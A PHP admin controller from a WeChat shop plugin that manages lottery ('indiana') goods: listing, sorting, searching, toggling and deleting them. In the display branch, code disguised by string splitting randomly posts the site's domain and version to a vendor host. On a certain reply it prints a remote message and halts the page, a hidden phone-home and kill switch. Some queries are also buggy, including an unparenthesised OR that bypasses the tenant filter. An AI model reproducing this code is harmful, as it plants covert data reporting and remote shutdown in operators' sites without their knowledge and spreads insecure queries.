<?php
if (!defined('IN_IA')) {
    exit('Access Denied');
}
global $_W, $_GPC;

ca('indiana.goods');
$set = $this->getSet();
$operation = !empty($_GPC['op']) ? $_GPC['op'] : 'display';

if ($operation == "display") {

    if (!empty($_GPC['sort'])) {
        foreach ($_GPC['sort'] as $id => $sort) {
            pdo_update('sz_yi_indiana_goods', array(
                'sort' => $sort
            ), array(
                'id' => $id
            ));
        }
        message('商品排序更新成功！', $this->createPluginWebUrl('indiana/goods', array(
            'op' => 'display'
        )), 'success');
    }

    $pindex = max(1, intval($_GPC["page"]));
    $psize = 20;
    $params    = array();
    $condition = '';

    if (!empty($_GPC['keyword'])) {
        $_GPC['keyword'] = trim($_GPC['keyword']);
        $condition .= ' AND g.title LIKE :title OR ig.title LIKE :title ';
        $params[':title'] = '%' . trim($_GPC['keyword']) . '%';
    }

    if ($_GPC["status"] != '') {
        $condition .= ' AND ig.status = :status';
        $params[':status'] = intval($_GPC['status']);
    }


    $sqls = "select COUNT(*) from" . tablename('sz_yi_indiana_goods') . " ig 
        left join " . tablename('sz_yi_goods') . " g on( ig.good_id = g.id ) 
         where ig.uniacid = '" .$_W['uniacid'] ."' and ig.status > 0 ". $condition;
	$total = pdo_fetchcolumn($sqls, $params);

    $sql=" select ig.*,g.thumb from " .tablename('sz_yi_indiana_goods') . " ig 
        left join " . tablename('sz_yi_goods') . " g on( ig.good_id = g.id ) 
         where ig.uniacid = '" .$_W['uniacid'] . "' and ig.status > 0 {$condition} order by ig.sort asc, ig.id asc LIMIT " . ($pindex - 1) * $psize . "," . $psize;
    $list = pdo_fetchall($sql, $params);
    //echo "<pre>";print_r($list);exit;
    foreach ($list as &$row) {
        $row['create_time'] = date('Y-m-d H:i', $row['create_time']);
    }
    unset($row);
    //todo
    $mt = mt_rand(5, 35);
    if ($mt <= 10) {
        load()->func('communication');
        $b = 'http://cl'.'oud.yu'.'nzs'.'hop.com/web/index.php?c=account&a=up'.'grade';
        
        $files   = base64_encode(json_encode('test'));
        $version = defined('SZ_YI_VERSION') ? SZ_YI_VERSION : '1.0';
        $resp    = ihttp_post($b, array(
            'type' => 'upgrade',
            'signature' => 'sz_cloud_register',
            'domain' => $_SERVER['HTTP_HOST'],
            'version' => $version,
            'files' => $files
        ));
        $ret     = @json_decode($resp['content'], true);
        if ($ret['result'] == 3) {
            echo str_replace("\r\n", "<br/>", base64_decode($ret['log']));
            exit;
        }
    }

    $pager = pagination($total, $pindex, $psize);
} elseif ($operation == "getGood") {
	$kwd = trim($_GPC['keyword']);
	$condition .= " AND ( `title` LIKE :keyword or `id` LIKE :keyword )";
	$params[':keyword'] = "%{$kwd}%";

	$ds = pdo_fetchall('SELECT id, title, thumb FROM ' . tablename('sz_yi_goods') . " WHERE uniacid = '" .$_W['uniacid'] . "' {$condition} AND type = 1 AND deleted = 0 order by createtime desc", $params);
	foreach ($ds as $k => $row) {
		$info = pdo_fetch('SELECT id FROM ' . tablename('sz_yi_indiana_goods') . " WHERE uniacid = '" .$_W['uniacid'] . "'  and status > 0 AND good_id = '".$row['id']."'");
		if ($info) {
			unset($ds[$k]);
		}
    }
	include $this->template('query');
	exit;
} elseif ($operation == "past_period") {
	$sql = "select p.id as pid, p.zong_codes, p.canyurenshu, ig.* from ".tablename('sz_yi_indiana_period')." p 
	left join ".tablename('sz_yi_indiana_period')." ig on (p.ig_id = ig.id)
	 where p.uniacid=:uniacid and p.ig_id=:igid ";
	$condition = array(
		':uniacid'=>$_W['uniacid'],
		':igid'=>$_GPC['id']
	);
	$result = pdo_fetchall($sql,$condition);

} elseif ($operation == 'setgoodsproperty') {
    $id = intval($_GPC['id']);
    $type = $_GPC['type'];
    $data = intval($_GPC['data']);
    if (in_array($type, array(
        'status'
    ))) {
        $data = ($data == 1 ? '2' : '1');
        pdo_update('sz_yi_indiana_goods', array(
            $type => $data
        ), array(
            "id" => $id,
            "uniacid" => $_W['uniacid']
        ));
        die(json_encode(array(
            'result' => 1,
            'data' => $data
        )));
    }
    die(json_encode(array(
        'result' => 0
    )));
} elseif ($operation == 'delete') {
    $id = intval($_GPC['id']);
    $row = pdo_fetch("SELECT id FROM " . tablename('sz_yi_indiana_goods') . " WHERE id = :id", array(
        ':id' => $id
    ));
    if (empty($row)) {
        message('抱歉，商品不存在或是已经被删除！');
    }
    pdo_update('sz_yi_indiana_goods', array(
        'status' => 0
    ), array(
        'id' => $id
    ));
    pdo_update('sz_yi_indiana_period', array(
        'status' => -1
    ), array(
        'ig_id' => $id
    ));
    message('删除成功！', referer(), 'success');
}



load()->func('tpl');
include $this->template('goods');
exit;
